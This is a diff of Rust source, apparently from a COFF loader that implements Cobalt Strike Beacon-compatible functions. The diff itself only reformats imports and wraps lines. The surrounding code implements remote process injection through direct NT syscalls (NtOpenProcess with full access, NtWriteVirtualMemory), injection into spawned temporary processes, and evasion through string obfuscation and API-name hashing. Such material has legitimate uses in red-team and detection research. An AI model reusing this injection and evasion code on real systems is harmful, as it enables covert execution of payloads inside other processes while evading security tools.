@@ -11,43 +11,30 @@ use core::{
     ptr::{self, null_mut},
 };
 
-use spin::Mutex;
-use obfstr::obfstr as s;
-use dinvk::{winapis::NtCurrentProcess, syscall};
 use dinvk::types::OBJECT_ATTRIBUTES;
+use dinvk::{syscall, winapis::NtCurrentProcess};
+use obfstr::obfstr as s;
+use spin::Mutex;
 use windows_sys::Win32::{
+    Foundation::{CloseHandle, DuplicateHandle, FALSE, HANDLE, STATUS_SUCCESS},
     Security::*,
-    Foundation::{CloseHandle, DuplicateHandle, HANDLE, STATUS_SUCCESS, FALSE},
     System::{
-        Threading::*,
-        WindowsProgramming::CLIENT_ID,
         Diagnostics::Debug::{
-            GetThreadContext,
-            SetThreadContext,
-            ReadProcessMemory,
-            WriteProcessMemory,
-            CONTEXT,
+            CONTEXT, GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory,
         },
         Memory::{
-            MEM_COMMIT,
-            MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
-            MEMORY_BASIC_INFORMATION,
-            MEMORY_MAPPED_VIEW_ADDRESS,
-            VirtualAlloc,
-            VirtualAllocEx,
-            VirtualProtect,
-            VirtualProtectEx,
-            VirtualFree,
-            VirtualQuery,
-            UnmapViewOfFile,
+            MEM_COMMIT, MEM_RESERVE, MEMORY_BASIC_INFORMATION, MEMORY_MAPPED_VIEW_ADDRESS,
+            PAGE_EXECUTE_READWRITE, UnmapViewOfFile, VirtualAlloc, VirtualAllocEx, VirtualFree,
+            VirtualProtect, VirtualProtectEx, VirtualQuery,
         },
+        Threading::*,
+        WindowsProgramming::CLIENT_ID,
     },
 };
 
-use const_hashes::murmur3;
-use const_encrypt::obf;
 use crate::error::{CoffeeLdrError, Result};
+use const_encrypt::obf;
+use const_hashes::murmur3;
 
 /// Global output buffer used by Beacon-compatible functions.
 static BEACON_BUFFER: Mutex<BeaconOutputBuffer> = Mutex::new(BeaconOutputBuffer::new());
@@ -90,7 +77,8 @@ unsafe impl Send for DataStoreObject {}
 unsafe impl Sync for DataStoreObject {}
 
 /// Global data store for BOF file/data sharing.
-static BEACON_DATA_STORE: Mutex<[DataStoreObject; DATA_STORE_MAX_ENTRIES]> = Mutex::new([const { DataStoreObject::empty() }; DATA_STORE_MAX_ENTRIES]);
+static BEACON_DATA_STORE: Mutex<[DataStoreObject; DATA_STORE_MAX_ENTRIES]> =
+    Mutex::new([const { DataStoreObject::empty() }; DATA_STORE_MAX_ENTRIES]);
 
 /// A buffer used for managing and collecting output for the beacon.
 #[repr(C)]
@@ -266,8 +254,12 @@ pub fn get_function_internal_address(name: &str) -> Result<usize> {
         H_BEACON_GET_SPAWN_TO => Ok(beacon_get_spawn_to as *const () as usize),
         H_BEACON_INJECT_PROCESS => Ok(beacon_inject_process as *const () as usize),
         H_BEACON_CLEANUP_PROCESS => Ok(beacon_cleanup_process as *const () as usize),
-        H_BEACON_SPAWN_TEMPORARY_PROCESS => Ok(beacon_spawn_temporary_process as *const () as usize),
-        H_BEACON_INJECT_TEMPORARY_PROCESS => Ok(beacon_inject_temporary_process as *const () as usize),
+        H_BEACON_SPAWN_TEMPORARY_PROCESS => {
+            Ok(beacon_spawn_temporary_process as *const () as usize)
+        }
+        H_BEACON_INJECT_TEMPORARY_PROCESS => {
+            Ok(beacon_inject_temporary_process as *const () as usize)
+        }
 
         // Data
         H_BEACON_DATA_INT => Ok(beacon_data_int as *const () as usize),
@@ -308,8 +300,12 @@ pub fn get_function_internal_address(name: &str) -> Result<usize> {
 
         // Data Store
         H_BEACON_DATA_STORE_GET_ITEM => Ok(beacon_data_store_get_item as *const () as usize),
-        H_BEACON_DATA_STORE_PROTECT_ITEM => Ok(beacon_data_store_protect_item as *const () as usize),
-        H_BEACON_DATA_STORE_UNPROTECT_ITEM => Ok(beacon_data_store_unprotect_item as *const () as usize),
+        H_BEACON_DATA_STORE_PROTECT_ITEM => {
+            Ok(beacon_data_store_protect_item as *const () as usize)
+        }
+        H_BEACON_DATA_STORE_UNPROTECT_ITEM => {
+            Ok(beacon_data_store_unprotect_item as *const () as usize)
+        }
         H_BEACON_DATA_STORE_MAX_ENTRIES => Ok(beacon_data_store_max_entries as *const () as usize),
 
         _ => Err(CoffeeLdrError::FunctionInternalNotFound(name.to_string())),
@@ -425,7 +421,8 @@ fn beacon_format_free(format: *mut Format) {
 
     unsafe {
         if !(*format).original.is_null() {
-            let layout_result = Layout::from_size_align((*format).size as usize, Layout::new::<i8>().align());
+            let layout_result =
+                Layout::from_size_align((*format).size as usize, Layout::new::<i8>().align());
             if let Ok(layout) = layout_result {
                 alloc::alloc::dealloc((*format).original as *mut u8, layout);
                 (*format).original = null_mut();
@@ -451,7 +448,11 @@ unsafe extern "C" fn beacon_formt_printf(format: *mut Format, fmt: *const c_char
     let fmt_str = CStr::from_ptr(fmt).to_str().unwrap_or("");
     let mut temp_str = String::new();
 
-    printf_compat::format(fmt_str.as_ptr().cast(), args, printf_compat::output::fmt_write(&mut temp_str));
+    printf_compat::format(
+        fmt_str.as_ptr().cast(),
+        args,
+        printf_compat::output::fmt_write(&mut temp_str),
+    );
 
     let length_needed = temp_str.len() as c_int;
     if (*format).length + length_needed >= (*format).size {
@@ -678,13 +679,13 @@ fn to_wide_char(src: *const c_char, dst: *mut u16, max: c_int) -> c_int {
 
 /// Performs remote process injection into a target process via NT syscalls.
 fn beacon_inject_process(
-    _h_process: HANDLE, 
-    pid: c_int, 
-    payload: *const c_char, 
-    len: c_int, 
-    _offset: c_char, 
-    _arg: *const c_char, 
-    _a_len: c_int
+    _h_process: HANDLE,
+    pid: c_int,
+    payload: *const c_char,
+    len: c_int,
+    _offset: c_char,
+    _arg: *const c_char,
+    _a_len: c_int,
 ) {
     if payload.is_null() || len <= 0 {
         return;
@@ -698,7 +699,13 @@ fn beacon_inject_process(
         };
 
         let mut h_process = null_mut::<c_void>();
-        let status = syscall!(s!("NtOpenProcess"), &mut h_process, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
+        let status = syscall!(
+            s!("NtOpenProcess"),
+            &mut h_process,
+            PROCESS_ALL_ACCESS,
+            &mut oa,
+            &mut ci
+        );
         if status != Some(STATUS_SUCCESS) {
             return;
         }
@@ -721,7 +728,14 @@ fn beacon_inject_process(
         }
 
         let mut now = 0usize;
-        status = syscall!(s!("NtWriteVirtualMemory"), h_process, address, payload as *const c_void, len as usize, &mut now);
+        status = syscall!(
+            s!("NtWriteVirtualMemory"),
+            h_process,
+            address,
+            payload as *const c_void,
+            len as usize,
+            &mut now
+        );
         if status != Some(STATUS_SUCCESS) {
             CloseHandle(h_process);
             return;
@@ -829,7 +843,10 @@ fn beacon_inject_temporary_process(
             h_process,
             null_mut(),
             0,
-            Some(core::mem::transmute::<*mut c_void, unsafe extern "system" fn(*mut c_void) -> u32>(entry_point)),
+            Some(core::mem::transmute::<
+                *mut c_void,
+                unsafe extern "system" fn(*mut c_void) -> u32,
+            >(entry_point)),
             null_mut(),
             0,
             &mut thread_id,
@@ -992,7 +1009,11 @@ fn beacon_remove_value(key: *const c_char) -> i32 {
     };
 
     let mut store = BEACON_KV_STORE.lock();
-    if store.remove(key_str).is_some() { 1 } else { 0 }
+    if store.remove(key_str).is_some() {
+        1
+    } else {
+        0
+    }
 }
 
 /// Allocates virtual memory in the current process.
@@ -1096,7 +1117,9 @@ fn beacon_close_handle(handle: HANDLE) -> i32 {
 /// Unmaps a mapped view of a file from the calling process's address space.
 /// Proxy to kernel32!UnmapViewOfFile.
 fn beacon_unmap_view_of_file(base_address: *const c_void) -> i32 {
-    let addr = MEMORY_MAPPED_VIEW_ADDRESS { Value: base_address as *mut c_void };
+    let addr = MEMORY_MAPPED_VIEW_ADDRESS {
+        Value: base_address as *mut c_void,
+    };
     unsafe { UnmapViewOfFile(addr) }
 }
 
